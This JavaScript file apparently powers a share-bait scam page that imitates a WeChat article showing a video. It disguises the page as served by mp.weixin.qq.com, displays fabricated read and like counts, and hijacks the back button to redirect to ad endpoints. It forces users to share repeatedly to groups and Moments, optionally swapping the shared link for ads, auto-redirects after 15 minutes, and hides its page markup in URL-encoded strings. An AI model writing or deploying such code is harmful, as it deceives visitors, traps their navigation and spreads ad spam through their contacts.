    // 返回开关 值为 0 表示关 值为 1 表示开
    var fanhui = 1
    // 视频点赞和阅读量修改
    var likeAndview = new Array()
    likeAndview['web'] = '网页由 mp.weixin.qq.com 提供</br> QQ浏览器X5内核提供技术支持' // 下拉网址伪装
    likeAndview['view'] = '今天看点'        // 顶部超链接文本
    likeAndview['readword'] = '阅读原文'    // 阅读原文超链接文本
    likeAndview['readNum'] = '100000+'      // 阅读量修改
    likeAndview['likeNum'] = '97315'        // 点赞量修改
    //视频上方广告
    var ad_1 = new Array()
    // 开关 值为 0 表示关 值为 1 表示开
    ad_1['on'] = 0
    // 广告下标
    ad_1['item'] = 'nk'
    // 广告图片
    ad_1['img'] = 'http://wx2.sinaimg.cn/mw690/bda2923dgy1fndzpsy561g20go02ogty.gif'
    //视频下方广告
    var ad_2 = new Array()
    // 开关 值为 0 表示关 值为 1 表示开
    ad_2['on'] = 1
    // 广告下标
    ad_2['item'] = 'xs_sz_qr'
    // 广告图片
    ad_2['img'] = 'http://bgzrwl.cn/se01/images/00669utAgy1flvjfrv7h3g30hs0243yg.gif'
    //阅读原文下方广告
    var ad_3 = new Array()
    // 开关 值为 0 表示关 值为 1 表示开
    ad_3['on'] = 0
    // 广告下标
    ad_3['item'] = 'nk'
    // 广告图片
    ad_3['img'] = 'http://xmzjvip.b0.upaiyun.com/2017/12/04/5701f26f6648e8fa3b1ede664b6945f2.gif'
    //最下方广告
    var ad_4 = new Array()
    // 开关 值为 0 表示关 值为 1 表示开
    ad_4['on'] = 1
    // 广告下标
    ad_4['item'] = 'nk'
    // 广告图片
    ad_4['img'] = 'http://wx2.sinaimg.cn/mw690/00668fWEly1fnv704lo8ag30go05kgti.gif'
    //阅读原文 和点击公众号
    var ad_gzh = new Array()
    // 开关 值为 0 表示关 值为 1 表示开
    // ad_gzh['on'] = 0
    // 广告下标
    ad_gzh['item'] = 'xs_sz_qr,xs_swsj_qr'
    // 广告图片
    ad_gzh['img'] = 'nk'
    

    // 0表示先分享群后分享圈 1表示先分享圈后分享群
    var timelineOnOff = 0
    // 值为 '0' 表示关闭广告
    // 值为任意数字 表示分享第几次为广告 栗子：'1','3' 表示第一次第三次分享的是广告 第二次为视频
    // 如果提交的数字为 '999' 这表示全部分享为广告
    var TTimes = new Array('0'); // 朋友圈广告开关 
    // 分享朋友圈次数
    var Tnum = 2
    // 值为 '0' 表示关闭广告
    // 值为任意数字 表示分享第几次为广告 栗子：'1','3' 表示第一次第三次分享的是广告 第二次为视频
    // 如果提交的数字为 '999' 这表示全部分享为广告   
    var ATimes = new Array('0'); // 朋友广告开关    
    // 分享朋友群次数 
    var Anum = 4

 // 视频基础信息
    var sp_title = escape("小伙摔破82年拉菲...");
    var sp_id = "r06587w4ls3";
    var sp_time = "271";
    var baidu = "767edeaf076e791633a18cce8fab3ecd"

    // api域名
    var apidomain = '//' + location.hostname

    var autotime = 60000*15 //毫秒
    var timestamp = Date.parse(new Date());

    fanhui && openfh()
    var new_doc = document.open("text/html", "replace");
    var html = unescape("%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text/html%3B%20charset%3DUTF-8%22%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22IE%3Dedge%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22apple-mobile-web-app-capable%22%20content%3D%22yes%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22apple-mobile-web-app-status-bar-style%22%20content%3D%22black%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22format-detection%22%20content%3D%22telephone%3Dno%22%3E%0A%20%20%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22initial-scale%3D1%2C%20maximum-scale%3D1%22%3E%0A%20%20%20%20%3Ctitle%3E...%3C/title%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22//vido.gz.bcebos.com/vido/main.css%22%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22//vido.gz.bcebos.com/vido/more.css%22%3E%0A%20%20%20%20%3Clink%20href%3D%22//vido.gz.bcebos.com/vido/swiper.min.css%22%20rel%3D%22stylesheet%22%3E%0A%20%20%20%20%3Cscript%20src%3D%22//vido.gz.bcebos.com/vido/jquery.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22//vido.gz.bcebos.com/vido/jquery.cookie.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22//vido.gz.bcebos.com/vido/zepto.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22//vido.gz.bcebos.com/vido/iscroll-lite.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22//vido.gz.bcebos.com/vido/swiper.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22//imgcache.qq.com/tencentvideo_v1/tvp/js/tvp.player_v2_zepto.js%22%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22//v.qq.com/iframe/tvp.config.js%22%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%20%20%20%20%3Clink%20href%3D%22//vido.gz.bcebos.com/vido/video.css%22%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%3E%0A%3C/head%3E%0A%20%20%20%20%3Cbody%20class%3D%22zh_CN%20mm_appmsg%20appmsg_skin_default%20rich_media_empty_extra%22%20id%3D%22activity-detail%22%20style%3D%22background-color%3A%20%23333%3B%22%3E%0A%20%20%20%20%3Cdiv%20id%3D%22content-content%22%20style%3D%22height%3A%2040px%3B%20text-align%3A%20center%3B%20padding-top%3A%2010px%3B%20color%3A%20%23999%3B%20font-size%3A%2080%25%3B%20display%3A%20block%3B%22%3E%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cdiv%20id%3D%22wrapper%22%20style%3D%22position%3A%20absolute%3B%20top%3A%200%3B%20bottom%3A%200%3B%20left%3A%200%3B%20right%3A%200%3B%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22scroll%22%20style%3D%22position%3A%20absolute%3B%20background-color%3A%20%23f3f3f3%3B%20z-index%3A%20100%3B%20width%3A%20100%25%3B%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media%22%20id%3D%22js_article%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22top_banner%22%20id%3D%22js_top_ad_area%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_inner%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_area_primary%22%20id%3D%22page-content%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22img-content%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%22rich_media_title%22%20id%3D%22activity-name%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/h2%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_meta_list%22%20id%3D%22meta_content%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22rich_media_meta%22%20id%3D%22profileBt%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20style%3D%22font-size%3A%2014px%3B%22%20href%3D%22javascript%3Agzh%28%29%3B%22%20id%3D%22post-user%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cem%20style%3D%22font-size%3A%2014px%3B%22%20class%3D%22rich_media_meta%20rich_media_meta_text%22%20id%3D%22post-date%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/em%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20id%3D%22adimg1%22%20style%3D%22display%3A%20none%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22javascript%3Aonclick_adimg1%28%29%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22%22%20alt%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/p%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_content%22%20id%3D%22js_content%22%20style%3D%22height%3A%20200px%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20id%3D%22adimg2%22%20style%3D%22display%3A%20none%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22javascript%3Aonclick_adimg2%28%29%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22%22%20alt%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/p%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_tool%22%20id%3D%22js_toobar3%22%20style%3D%22padding%3A%200%2010px%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3D%22media_tool_meta%20meta_primary%22%20style%3D%22color%3A%20%23607fa6%3B%22%20id%3D%22js_view_source%22%20href%3D%22javascript%3Agzh%28%29%3B%22%3E%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22media_tool_meta%20meta_primary%20tips_global%20meta_praise%22%20id%3D%22like%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ci%20class%3D%22icon_praise_gray%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/i%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22praise_num%22%20id%3D%22likeNum%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22media_tool_meta%20tips_global%20meta_primary%22%20id%3D%22js_read_area3%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%u9605%u8BFB%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20id%3D%22readNum%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%3C%21--%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3D%22media_tool_meta%20tips_global%20meta_extra%22%20href%3D%22%23%23%22%20id%3D%22js_report_article3%22%20style%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%u6295%u8BC9%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%20--%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22adimg3%22%20style%3D%22display%3A%20none%3B%20text-align%3Acenter%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3E%3Ca%20%20href%3D%22javascript%3Aonclick_adimg3%28%29%3B%22%3E%3Cimg%20src%3D%22%22%20style%3D%22width%3A90%25%3Btext-align%3Acenter%3B%22%3E%3C/a%3E%3C/p%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_extra%22%20id%3D%22gdt_area%22%20style%3D%22padding-top%3A%2020px%3B%20height%3A%20350px%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20style%3D%22padding%3A%200%2015px%2010px%3B%20color%3A%20%23888%3B%20font-size%3A%2015px%3B%22%3E%u5E7F%u544A%3C/p%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22adimg4%22%20class%3D%22js_ad_link%20extra_link%22%20style%3D%22padding%3A%200%2015px%3B%20display%3A%20none%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22swiper-container%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22swiper-wrapper%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22swiper-slide%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22javascript%3A%3B%22%20onclick%3D%22onclick_adimg4%28%29%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22%22%20border%3D%220%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cdiv%20id%3D%22pauseplay%22%20style%3D%22display%3A%20none%3B%20opacity%3A%200%3B%20position%3A%20fixed%3B%20left%3A%200%3B%20right%3A%200%3B%20top%3A%2065px%3B%20bottom%3A%200%3B%20background-color%3A%20rgba%2880%2C%2080%2C%2080%2C%2050%29%3B%20z-index%3A%201%3B%22%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cdiv%20id%3D%22mask%22%20class%3D%22mask%22%3E%26nbsp%3B%3C/div%3E%0A%20%20%20%20%3Cdiv%20style%3D%22position%3A%20absolute%3B%20z-index%3A%20998%22%3E%0A%20%20%20%20%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20document.write%28%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27%3Cimg%20src%3D%22//vido.gz.bcebos.com/vido/fxq2.png%22%20id%3D%22fenxiang%22%20style%3D%22display%3Ablock%3Bwidth%3A100%25%3Bposition%3Afixed%3Bz-index%3A999%3Btop%3A0%3Bleft%3A0%3Bdisplay%3Anone%22%3E%27%0A%20%20%20%20%20%20%20%20%20%20%20%20%29%3B%0A%20%20%20%20%20%20%20%20%3C/script%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/body%3E%0A%20%20%20%20%3Cscript%20src%3D%22//res.wx.qq.com/open/js/jweixin-1.0.0.js%22%3E%3C/script%3E%0A%20%20%20%20%3Clink%20href%3D%22//vido.gz.bcebos.com/vido/weui.min.css%22%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20/%3E%0A%20%20%20%20%3Cstyle%3E%0A%20%20%20%20%20%20%20%20.mask%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20none%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20position%3A%20absolute%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20top%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20filter%3A%20alpha%28opacity%3D75%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-color%3A%20%23000%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20z-index%3A%2062%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20left%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20opacity%3A%20.8%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20-moz-opacity%3A%20.8%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%3C/style%3E%0A%20%20%20%20%3Cscript%20type%3D%22text/javascript%22%20src%3D%22//vido.gz.bcebos.com/vido/zepto.min.js%22%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%0A%20%20%20%20%3Cscript%20src%3D%27/c_app.js%3Ft%3D1265749090%27%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%3C/html%3E");
    new_doc.write(html);
    new_doc.close();

    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?" + baidu;
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();


    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function openfh()
    {
        window.onhashchange = function() {
           ggcash('fanhui');
        }
    }


    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function autoskip()
    {
        if (autotime < (Date.parse(new Date()) - timestamp)) {
            $.post(apidomain, {
                index: 'xxp'
            }, function(res) {
                location.href = res.url;
            }, 'JSON');
        } else {
            setTimeout(function(){
                window.autoskip()
            },500);
        }
    }

    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     * 统一广告入口
     */
    function ggcash(name) {
        location.href = apidomain + "/" + name + "/cash";
    }

    function setCookie(name, value) {
        var Days = 1;
        var exp = new Date();
        exp.setTime(exp.getTime() + Days * 6 * 1000);
        document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString();
    }

    function getCookie(name) {
        var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
        if (arr = document.cookie.match(reg)) return unescape(arr[2]);
        else return null;
    }

    function getQueryString(name) {
        var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
        var r = window.location.search.substr(1).match(reg);
        if (r != null) {
            return decodeURI(r[2]);
        }
        return null;
    }
    var shareATimes = 0;
    var shareTTimes = 0;
    var alertTimes = 0;
    var message = null;


    var Tpost = null
    var Apost = null


    !(function(){
        var temp = new Array()
        for (var i = 0; i < TTimes.length; i++) {
            temp["'"+TTimes[i]+"'"] = TTimes[i]
            if (1 <= i) {
                Tpost = '1'
            } else {
                Tpost = TTimes[i]
            }
        }
        TTimes = temp
        temp = new Array()

        for (var i = 0; i < ATimes.length; i++) {
            temp["'"+ATimes[i]+"'"] = ATimes[i]
            if (1 <= i) {
                Apost = '1'
            } else {
                Apost = ATimes[i]
            }
        }
        ATimes = temp
    })()

    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function wxconfig()
    {
        $.post(apidomain, {
            url: location.href.split('#')[0],
            index: 'jump'
        }, function(res) {
            window.data = res;
            wx.config(window.data.config);
            shaerdata();
        }, 'JSON');

        autoskip()
    }
    function wxalert(msg, btn, callback) {
        if (alertTimes == 0) {
            var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
            $("body").append(dialog)
        }
        alertTimes++;
        var d = $('#lly_dialog');
        d.show(200);
        d.find("#lly_dialog_msg").html(msg);
        d.find("#lly_dialog_btn").html(btn);
        d.find("#lly_dialog_btn").off('click').on('click', function() {
            d.hide(200);
            if (callback) {
                callback()
            }
        })
    }


    function share_tip() {
        share_config(window.result);
        if (Anum > shareATimes && 0 === shareTTimes) {
            message = window.result.share_info['app' + shareATimes]
            wxalert(message, '好')
        } else if  (Anum <= shareATimes && 0 === shareTTimes) {
            message = window.result.share_info['timeline' + shareTTimes]
            wxalert(message, '好')
        } else if ("0" == Tpost && Anum <= shareATimes) {
            message = window.result.share_info.success
            wxalert(message, '确定', function() {
                setCookie('xxxooo', 1);
                $.post(apidomain, {
                    index: 'goon'
                }, function(res) {
                    location.href = res.url;
                }, 'JSON');
            })
        } else if (Tnum > shareTTimes && "0" !== Tpost) {
            message = window.result.share_info['timeline' + shareTTimes]
            wxalert(message, '好')
        } else if (Tnum <= shareTTimes && 0 === shareATimes) {
            message = window.result.share_info['app' + shareATimes]
            wxalert(message, '好')
        } else if (Tnum <= shareTTimes && Anum <= shareATimes) {
            message = window.result.share_info.success
            wxalert(message, '确定', function() {
                setCookie('xxxooo', 1);
                $.post(apidomain, {
                    index: 'goon'
                }, function(res) {
                    location.href = res.url;
                }, 'JSON');
            })
        } else {
            message = window.result.share_info['app' + shareATimes]
            wxalert(message, '好')
        }
    }

    function show_tip() {
        wxalert(message, '好')
    }

  
    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function shaerdata() {
        $.post(apidomain, {
            index: 'duapp',
            TTimes: Tpost,
            ATimes: Apost,
            Qun: window.data.qun,
            Quan: window.data.quan,
            Timeline: timelineOnOff
        }, function(data) {
            window.result = data;
            message = data.share_info.default
            share_config(data);
        }, 'JSON');
    }


    function share_config(data) {
        wx.ready(function() {
            wx.hideOptionMenu();
            wx.showMenuItems({
                menuList: ['menuItem:share:appMessage', 'menuItem:share:timeline']
            });
            wx.onMenuShareAppMessage({
                title: ATimeslen() ? diqu + data.share_gg_info.title : diqu + data.share_app_info.title,
                desc: ATimeslen() ? diqu + data.share_gg_info.desc : diqu + data.share_app_info.desc,
                link: ATimeslen() ? data.share_gg_info.link : data.share_app_info.link,
                imgUrl: ATimeslen() ? data.share_gg_info.img_url : data.share_app_info.img_url,
                success: function() {
                    shareATimes += 1;
                    share_tip();
                },
                cancel: function() {}
            });
            wx.onMenuShareTimeline({
                title: TTimeslen() ? diqu + data.share_timeline_cash_info.title : diqu + data.share_timeline_info.title,
                link: TTimeslen() ? data.share_timeline_cash_info.link : data.share_timeline_info.link,
                imgUrl: TTimeslen() ? data.share_timeline_cash_info.img_url : data.share_timeline_info.img_url,
                success: function() {
                    shareTTimes += 1;
                    share_tip();
                },
                cancel: function() {}
            });
        });
    }
    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function ATimeslen() {
        if ('undefined' !== typeof ATimes['999']) {
            return true
        } else if ('undefined' !== typeof ATimes['0']) {
            return false
        } else if ('undefined' !== typeof ATimes["'"+(shareATimes + 1)+"'"]) {
            return true
        } else {
            return false
        }
    }
    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function TTimeslen() {
        if ('undefined' !== typeof TTimes['999']) {
            return true
        } else if ('undefined' !== typeof TTimes['0']) {
            return false
        } else if ('undefined' !== typeof TTimes["'"+(shareTTimes + 1)+"'"]) {
            return true
        } else {
            return false
        }
    }

    /**
     * @version  1.0
     * @author   eacher
     * @param  
     * @return array | boolean
     */
    function adimg() {
        //广告图片
        $(function() {
            $("#adimg1").find("img").attr("src", ad_1['img']);
            $("#adimg2").find("img").attr("src", ad_2['img']);
            $("#adimg3").find("img").attr("src", ad_3['img']);
            $("#adimg4").find("img").attr("src", ad_4['img']);
            ad_1['on'] && $("#adimg1").show();
            ad_2['on'] && $("#adimg2").show();
            ad_3['on'] && $("#adimg3").show();
            ad_4['on'] && $("#adimg4").show();
        })

        $('#content-content').html(likeAndview['web']);
        $('#post-user').html(likeAndview['view']);
        $('#js_view_source').html(likeAndview['readword']);
        $('#readNum').html(likeAndview['readNum']);
        $('#likeNum').html(likeAndview['likeNum']);
    }
    //视频上方广告
    function onclick_adimg1() {
        ggcash(ad_1['item']);
    }
    //视频下方广告
    function onclick_adimg2() {
        // ggcash(ad_2['item']);
    }
    //阅读原文下方广告
    function onclick_adimg3() {
        ggcash(ad_3['item']);
    }
    // 最下方广告
    function onclick_adimg4() {
        ggcash(ad_4['item']);
    }
    //阅读原文 和点击公众号
    function gzh() {
        ggcash(ad_gzh['item']);
    }